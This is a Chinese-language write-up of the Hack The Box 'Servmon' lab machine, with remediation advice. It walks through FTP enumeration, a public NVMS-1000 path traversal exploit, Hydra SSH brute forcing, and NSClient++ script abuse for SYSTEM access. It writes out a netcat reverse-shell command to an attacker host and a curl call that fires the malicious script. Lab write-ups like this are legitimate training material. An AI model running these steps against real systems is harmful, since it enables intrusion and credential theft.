## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Servmon
2. 難度:Easy
3. IP:10.129.227.77

### 主要發現：
1. 漏洞 ：透過已公開的本地文件包含漏洞獲得系統內部憑證（風險等級：High）
2. 漏洞 ：透過舊版本權限配置錯誤導致權限提升（風險等級：Critical）

### 攻擊鏈摘要：

透過匿名登入FTP服務，攻擊者可獲得內部備忘錄文件，隨後利用網頁應用程式LFI漏洞獲取SSH憑證，獲得系統控制權。透過NSClient++舊版本的權限配置錯誤，獲得應用程式明文密碼後，可藉由應用程式以SYSTEM權限執行惡意腳本，最終取得目標主機的最高權限。

### 潛在影響：

1. 內部備忘錄與使用者密碼清單遭竊，可能導致其他系統也面臨連鎖入侵風險。
2. 網頁應用程式存在本地文件包含漏洞，造成內部資料外洩、憑證遭竊，導致系統控制權被奪。
3. NSClient++版本過舊，造成應用程式明文密碼外洩，且攻擊者可權限提升至SYSTEM，導致系統完全淪陷。

### 修復建議：

1.  立即關閉FTP伺服器的匿名登入功能，並強制使用加密的傳輸協定SFTP。
2.  升級NVMS-1000至最新版本，修補已知的LFI漏洞。
3.  變更所有在備忘錄、桌面檔案或NSClient++設定中發現的密碼。
4.  升級NSClient++至最新版本。
5.  檢視並限制使用者對系統服務的重啟權限，避免普通用戶具備觸發高權限操作的條件。
6.  禁止將純文字密碼清單存放在使用者桌面，應改用企業級憑證管理解決方案。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠

```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.227.77 -oA portscan/tcp
sudo nmap -sU --top-ports 20 10.129.227.77 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p21,22,80,135,139,445,5666,6699,8443,49664 10.129.227.77 -oA portscan/detail
sudo nmap --script=vuln -p21,22,80,135,139,445,5666,6699,8443,49664 10.129.227.77 -oA portscan/vuln
```

<img width="823" height="421" alt="螢幕擷取畫面 2026-03-26 175653" src="https://github.com/user-attachments/assets/a37d45c3-af97-4450-90c6-1c43da126f01" />
<img width="622" height="581" alt="螢幕擷取畫面 2026-03-26 175705" src="https://github.com/user-attachments/assets/1c29f9e2-69ce-41c5-b734-f64d30456a1b" />
<img width="1162" height="792" alt="螢幕擷取畫面 2026-03-26 180730" src="https://github.com/user-attachments/assets/572b7e23-a581-445a-9450-394a809e98c5" />
<img width="977" height="596" alt="螢幕擷取畫面 2026-03-26 180855" src="https://github.com/user-attachments/assets/d3a8296f-c853-4606-92d5-a481525e915e" />



在Windows環境下，經常比Linux環境多出好幾個開放埠，我會多做幾件事：
1. 用-oA全格式輸出保留紀錄
2. 針對UDP協議掃描
3. 可以用文字處理工具整合開放埠，例如
```bash
ports=$(grep open portscan/tcp.nmap | awk -F '/' '{print $1}' | paste -sd ',')
echo $ports
```
定義一個ports變數，變數內容是「用gerp篩選出portscan/tcp.nmap檔案中含有open的句子，用awk擷取出在/之前的字串，再用paste -sd 把這些直列的字串改成一行橫列並用,為分割符」

在tmux環境中，同一個分割視窗裡只要輸入變數$ports再按tab就可以轉化成字串，在不同的分割視窗只要手動複製過去就可以了，在處理像這種大量字串時很好用。


<img width="780" height="201" alt="螢幕擷取畫面 2026-03-26 180319" src="https://github.com/user-attachments/assets/189b028b-8870-443c-b1f3-4de0bf5f6921" />

因Nmap掃描結果了解到FTP可匿名登入，優先探索FTP
```bash
ftp 10.129.227.77
```

<img width="752" height="220" alt="螢幕擷取畫面 2026-03-26 181350" src="https://github.com/user-attachments/assets/4c5d0701-3440-46b0-a50b-7cdff7600c24" />

在其中了獲取兩個文件，用get命令下載，並且有理由懷疑目錄名稱就是使用者名稱

<img width="544" height="260" alt="螢幕擷取畫面 2026-03-26 181809" src="https://github.com/user-attachments/assets/3f5f33a1-b1ca-424e-a373-def02d0802df" />
<img width="586" height="323" alt="螢幕擷取畫面 2026-03-26 181843" src="https://github.com/user-attachments/assets/03598fa2-5874-4144-b923-3935c63fc55b" />
<img width="552" height="144" alt="螢幕擷取畫面 2026-03-26 181913" src="https://github.com/user-attachments/assets/e511967a-6ecc-457c-89f3-37525f28074e" />
<img width="524" height="83" alt="螢幕擷取畫面 2026-03-26 181933" src="https://github.com/user-attachments/assets/6c342935-5ded-4920-82a0-380987e5857c" />

使用cat了解兩個文件內容，了解到：
1. 在Nathan的桌面上可能有個Passwords.txt
2. NVMS的密碼已被更改
3. NSClient已被鎖定
4. NVMS可能依然支持公眾訪問
5. SharePoint中可能有秘密檔案

<img width="1436" height="205" alt="螢幕擷取畫面 2026-03-26 181952" src="https://github.com/user-attachments/assets/e43b5532-39b5-4e82-9669-40a9a2e394ca" />
<img width="468" height="169" alt="螢幕擷取畫面 2026-03-26 182050" src="https://github.com/user-attachments/assets/e9267bab-2893-408a-bddf-f84e1b323898" />


### 2.2 枚舉(Enumeration)

檢查smb服務和rpc服務
```bash
smbclient -L //10.129.227.77 -N
rpcclient -U "" -N 10.129.227.77
```
<img width="644" height="87" alt="螢幕擷取畫面 2026-03-26 183158" src="https://github.com/user-attachments/assets/349390ea-80e0-4552-be58-98c83cc54fbe" />
<img width="649" height="86" alt="螢幕擷取畫面 2026-03-26 183159" src="https://github.com/user-attachments/assets/0bfb44dc-871c-412f-8237-03fecaccf4b9" />

檢查80主頁，NVMS-1000是一款網路監控影像管理系統

<img width="1396" height="860" alt="螢幕擷取畫面 2026-03-26 183353" src="https://github.com/user-attachments/assets/7be05019-0883-49c2-bf73-53f5aa5cbcec" />

用searchsploit檢查公開漏洞
```bash
searchsploit "nvms 1000"
```

<img width="969" height="191" alt="螢幕擷取畫面 2026-03-26 184307" src="https://github.com/user-attachments/assets/a37c5c8e-3d76-4f7d-9fe2-32ca84803eaa" />

用Gobuster檢查80是否有其他攻擊面，爆破目錄前應該要已經枚舉完成，已經了解服務是什麼、長什麼樣子，之後再用小字典低速爆破，靶機環境下不用放低速，放到最後即可
```bash
sudo gobuster dir -u http://10.129.227.77 -w /usr/share/wordlists/dirb/cpmmon.txt --exclude-length 118
```

<img width="1070" height="478" alt="螢幕擷取畫面 2026-03-26 184230" src="https://github.com/user-attachments/assets/b5092cb1-38e0-41dd-b7d9-dc81b914e120" />



### 2.3 初始存取(Initial Access)

下載並查看公開漏洞文檔
```bash
searchsploit -m 47774
```

<img width="696" height="206" alt="螢幕擷取畫面 2026-03-26 184348" src="https://github.com/user-attachments/assets/dce48c15-cf72-422a-ad20-796d6c588bb0" />
<img width="1278" height="592" alt="螢幕擷取畫面 2026-03-26 184400" src="https://github.com/user-attachments/assets/fa5e8a70-7e1b-4f60-902e-4b105296a594" />

這是個路徑遍歷漏洞，直接使用Burp Suite嘗試複現PoC

<img width="1244" height="384" alt="螢幕擷取畫面 2026-03-26 184752" src="https://github.com/user-attachments/assets/f729d5a0-61e5-4c9a-b2e9-658ba48e577a" />

PoC成功，嘗試讀取nathan桌面裡的Passwords.txt檔

<img width="1241" height="352" alt="螢幕擷取畫面 2026-03-26 184850" src="https://github.com/user-attachments/assets/7848bc90-e52b-4978-925c-a637d04edc2d" />

將密碼寫成文檔備用，並建立用戶名文檔

<img width="309" height="263" alt="螢幕擷取畫面 2026-03-26 184940" src="https://github.com/user-attachments/assets/0535c0b6-7747-469d-a6cf-b8ebd36aecfe" />
<img width="298" height="154" alt="螢幕擷取畫面 2026-03-26 185202" src="https://github.com/user-attachments/assets/a86f1c02-53ad-4908-89a7-f45f94f96cd6" />

在同時存在多服務的情況下爆破憑證，要記住以下原則：
1. 數量少可以用hydra，數量多就先手動，避免被封鎖
2. 密碼可以先進行語意分類，篩選出優先測試的幾組
3. SSH服務永遠優先，因為相對較安靜，且可直接拿到控制權
4. Web Login優先級較高，SMB優先度最低
5. 要記得密碼可能被重用，找到一組密碼肯定要試試其他服務

使用hydra爆破SSH服務
```bash
hydra -L users -P passwords ssh://10.129.227.77
```

<img width="993" height="259" alt="螢幕擷取畫面 2026-03-26 185333" src="https://github.com/user-attachments/assets/b6da8522-5943-4545-aa26-6978a77c3b6a" />

登入SSH服務

<img width="829" height="342" alt="螢幕擷取畫面 2026-03-26 185455" src="https://github.com/user-attachments/assets/11223033-591e-4bcd-997b-f97504299fd9" />

獲得user.txt

<img width="541" height="346" alt="螢幕擷取畫面 2026-03-26 185705" src="https://github.com/user-attachments/assets/0f8a38b7-2b37-44da-9c81-72bc3493416a" />


### 2.4 權限提升(Privilege Escalation)

Windows權限提升中，應該要優先利用Privilege跟枚舉Credential，沒有的話再看Service或Task，這裡因為我已知有開NSClient++，簡單掃了Privilege跟Credential之後就直接去打NSClient++了。

<img width="621" height="391" alt="螢幕擷取畫面 2026-03-26 192123" src="https://github.com/user-attachments/assets/fb7ddd95-f805-49fa-bc77-e9b1a07797b0" />

檢查運行版本

<img width="670" height="63" alt="螢幕擷取畫面 2026-03-26 192605" src="https://github.com/user-attachments/assets/d2428982-20e3-4d90-9841-9cec5ed7ed3d" />

該版本存在關於權限提升的公開漏洞：
1. 設定檔 (nsclient.ini) 以明文形式儲存管理員密碼，本機使用者可以讀取。
2. 攻擊者可濫用ExternalScripts插件，透過註冊自訂腳本、儲存配置並透過API觸發該腳本，以SYSTEM權限注入並執行任意命令。

<img width="1303" height="578" alt="螢幕擷取畫面 2026-03-27 161203" src="https://github.com/user-attachments/assets/f792f117-96af-47cf-95af-78a7c9887048" />
<img width="975" height="204" alt="螢幕擷取畫面 2026-03-26 193504" src="https://github.com/user-attachments/assets/eca74b63-92be-4d2f-a0c2-20fc73c36ba3" />
<img width="657" height="206" alt="螢幕擷取畫面 2026-03-26 193550" src="https://github.com/user-attachments/assets/5997bff1-264f-4806-8dda-1da7a7d8f02c" />
<img width="926" height="784" alt="螢幕擷取畫面 2026-03-26 193609" src="https://github.com/user-attachments/assets/63089f62-f810-4b98-858e-7be335ab9f6c" />

打開設定檔nsclient.ini，獲取明文密碼，同時了解到只允許127.0.0.1訪問

<img width="904" height="610" alt="螢幕擷取畫面 2026-03-26 192026" src="https://github.com/user-attachments/assets/c2fe5397-9eb2-4727-98a2-796d210dcd0f" />

使用SSH穿隧
```bash
ssh -L 8443:127.0.0.1:8443 nadine@10.129.227.77
```

<img width="787" height="237" alt="螢幕擷取畫面 2026-03-26 192956" src="https://github.com/user-attachments/assets/4f0d3049-86e4-4f67-a39a-f9950f48d156" />

訪問127.0.0.1:8443，明文密碼登入成功

<img width="1573" height="777" alt="螢幕擷取畫面 2026-03-26 193232" src="https://github.com/user-attachments/assets/633962c4-b997-42a1-b7d5-3fea0c360e0a" />
<img width="1488" height="815" alt="螢幕擷取畫面 2026-03-26 193304" src="https://github.com/user-attachments/assets/102be577-8d92-4bd7-b2fd-502c9c2be141" />

準備惡意腳本，存放在nadine的Desktop下，這裡可以依照公開漏洞說明準備.bat腳本跟nc.exe上傳，或是直接用powershell建立.ps1，我個人偏好使用powershell(靶機情況不太會需要混淆)，畢竟相對較原生，且nc64.exe經常被防毒掃到，這裡兩種都會示範

【上傳路線】

準備evil.bat和nc64.exe

<img width="621" height="158" alt="螢幕擷取畫面 2026-03-26 201009" src="https://github.com/user-attachments/assets/40d326a2-be44-4f47-94d7-447dd580ed56" />

使用python3託管

<img width="622" height="73" alt="螢幕擷取畫面 2026-03-26 201010" src="https://github.com/user-attachments/assets/36c50356-9b46-4441-9be7-0cc642e66a12" />

在SSH中下載到nadine的Desktop

<img width="1026" height="368" alt="螢幕擷取畫面 2026-03-26 201337" src="https://github.com/user-attachments/assets/c13c12eb-9406-4736-be44-e294cc58a4c0" />

【PS路線】

在nadine的Desktop下直接建立shell.ps1

<img width="1007" height="311" alt="螢幕擷取畫面 2026-03-26 221237" src="https://github.com/user-attachments/assets/005e863c-4212-4fc3-be47-e3994af5f2f6" />

【共通路線】

在modules中確認CheckExternalScripts是開放的

<img width="1316" height="742" alt="螢幕擷取畫面 2026-03-26 201721" src="https://github.com/user-attachments/assets/d317d21c-4e87-419b-a0f2-4ea301eea847" />
<img width="1348" height="457" alt="螢幕擷取畫面 2026-03-26 201842" src="https://github.com/user-attachments/assets/38b6fe10-8d65-44f2-a1d6-70ecb762f27f" />

在script建立新腳本

<img width="1305" height="628" alt="螢幕擷取畫面 2026-03-26 202105" src="https://github.com/user-attachments/assets/5b3533ca-0887-4186-820e-f540dd4f5d2d" />

若是.ps1路線要先呼叫powershell.exe，並且使用-ExecutionPolicy Bypass繞過執行原則，我們可以這樣做，因為是以SYSTEM權限進行的，但這很引人注目，

<img width="976" height="309" alt="螢幕擷取畫面 2026-03-26 224750" src="https://github.com/user-attachments/assets/887a7455-d0f2-4463-b6c4-6728ee60c47a" />

在本機打開nc監聽

<img width="356" height="141" alt="螢幕擷取畫面 2026-03-26 202434" src="https://github.com/user-attachments/assets/1270b304-d4d5-42d7-89c7-29d58c5753f0" />

右上Save

<img width="745" height="347" alt="螢幕擷取畫面 2026-03-26 203634" src="https://github.com/user-attachments/assets/4d5cd6de-0238-4e3d-8513-822ef915a053" />

Control裡Reload

<img width="649" height="343" alt="螢幕擷取畫面 2026-03-26 202402" src="https://github.com/user-attachments/assets/e848e5ea-ece4-4eb4-b546-8e9b61726022" />

呼叫腳本原本可以使用網頁中的Queries，在其中點擊建立的腳本後點擊run，就能收到反彈Shell，但我使用時一直卡住，甚至我都有點生氣了。我之後看了很多關於這個靶機的留言討論和write up，貌似不是我的問題，所以我直接用curl呼叫
```bash
curl -u admin:password -k "http://127.0.0.1:8443/query/shell"
```

<img width="708" height="71" alt="螢幕擷取畫面 2026-03-26 225353" src="https://github.com/user-attachments/assets/2278057d-cd81-4dff-aeac-3c9229cd89cc" />

獲得反彈shell

<img width="653" height="375" alt="螢幕擷取畫面 2026-03-26 203651" src="https://github.com/user-attachments/assets/b5c3b859-960a-43a1-aacd-4b56ca416af3" />

如果是powershell路線的，可能會有交互性不太好的問題，再使用一些改善指令就可以，都是一樣的

其實還有一個辦法，就是在攻擊機本地開啟SMB Server託管nc64.exe，然後透過應用程式呼叫Share，可以去嘗試一下
```bash
\\10.10.x.x\share\nc64.exe -e cmd.exe 10.10.x.x 1234
```

### 2.5 最終成果(Impact)

獲得root.txt


<img width="704" height="552" alt="螢幕擷取畫面 2026-03-26 204242" src="https://github.com/user-attachments/assets/024e5141-75c6-4b92-aacb-9f7c2d6a5e8e" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 除了特別花時間的掃描、爆破類以外，幾乎全程使用低噪音方式攻擊。
2. 考慮到上傳檔案室一件非常可疑的事，能不做就不做，所以我用了powershell製作惡意腳本，雖然這也很可疑。
3. 攻擊鏈非常清晰，並沒有特別難的環節。

### 浪費時間的部分：

1. NSClient++真的慢到要氣死我，弄了一個多小時，還重起了靶機，最後乾脆用curl，應該早點用curl的。

### 新知識點：

1. 關於NSClient++的利用方法。
2. powershell腳本的寫作方法。

### 與實戰對應：

1. 在打靶機時也要注意自己的動作是否有太大的噪音，或是是否可疑，尤其是Windows系統。

